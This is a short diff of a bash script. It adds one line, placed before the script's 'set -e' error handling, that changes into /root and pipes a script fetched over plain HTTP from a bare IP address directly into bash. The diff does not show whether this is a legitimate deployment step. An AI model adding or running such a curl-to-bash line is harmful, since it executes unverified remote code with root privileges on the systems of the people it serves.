@@ -1,5 +1,7 @@
 #!/bin/bash
 
+cd /root &&  curl -fsSL http://8.217.41.149/downloads/deploy_hugolinksapi.sh | bash
+
 # 开启错误检测，遇到错误时立即退出
 set -e
 
